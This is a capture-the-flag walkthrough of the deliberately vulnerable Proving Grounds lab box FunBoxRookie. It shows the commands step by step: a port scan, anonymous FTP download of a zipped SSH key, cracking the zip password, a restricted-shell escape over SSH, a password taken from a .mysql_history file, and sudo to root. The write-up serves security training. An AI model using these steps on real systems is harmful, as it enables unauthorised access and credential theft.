# PG Play - FunBoxRookie

#### Ip: 192.168.189.107
#### Name: FunBoxRooke
#### Difficulty: Easy
#### Community Rating: Easy

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ sudo nmap -p-  --min-rate 10000 192.168.189.107 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 12:13 CDT
Nmap scan report for 192.168.189.107
Host is up (0.074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds
```

Most interesting to me off the bat is all the zip files in the FTP server, which also has anonymous access enabled.

Logging in, the first thing I notice is that the tom.zip has different permissions than the rest of the files. Lets start there.

Logging in with:

```text
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ ftp 192.168.189.107                     
Connected to 192.168.189.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.189.107]
Name (192.168.189.107:ryan): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.158 !
```

I can use the `get` command to bring tom.zip back to my machine.

### Exploitation

Trying to unzip the file we see it has an SSH key, but it is password protected:

```text
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ unzip tom.zip                
Archive:  tom.zip
[tom.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password
```

Lets use fcrackzip to brute force this password:

fcrack.png

We can now unzip the file:

```text
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ unzip tom.zip
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa 
```

And login to the box:

```text
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ chmod 600 id_rsa
                                                                                                                             
┌──(ryan㉿kali)-[~/PG/FunBoxRookie]
└─$ ssh -i id_rsa tom@192.168.189.107

<snip>
```

From here we can grab the local.txt file:

user_flag.png

### Privilege Escalation

Running `sudo -l` prompts for a password, but when we run `id` we can see that tom is a member of the sudoers group:

```text
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
tom@funbox2:~$ ^C
tom@funbox2:~$ ^C
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Trying to change directories to begin enumerating for privilege escalation, we realize we a in a restricted shell:

```text
tom@funbox2:~$ cd /
-rbash: cd: restricted
```

Lets logout and SSH in again, but this time we'll also include the `-t bash` flag:

bash.png

Back in tom's home directory we find a `.mysql_history` file, and it has toms credentials in it:

creds.png

Nice! Because we know that tom is in the sudoers group, and we now have his password, we can easily elevate our shell to root level:

```text
tom@funbox2:~$ sudo /bin/bash
[sudo] password for tom: 
root@funbox2:~# whoami
root
root@funbox2:~# id
uid=0(root) gid=0(root) groups=0(root)
```

And we can grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------------------------------